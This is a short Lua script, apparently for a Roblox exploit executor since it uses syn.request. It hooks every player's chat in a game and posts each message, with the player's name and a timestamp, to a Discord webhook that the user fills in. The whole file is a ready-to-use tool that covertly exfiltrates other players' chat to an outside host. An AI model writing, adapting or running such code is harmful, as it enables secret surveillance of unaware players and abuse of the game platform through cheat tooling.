--by hiddenguy67 on youtube/doritos#0001
local marketplaceService = game:GetService("MarketplaceService")

local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then

local wh = 'DISCORD WEBHOOK HERE'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end

game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end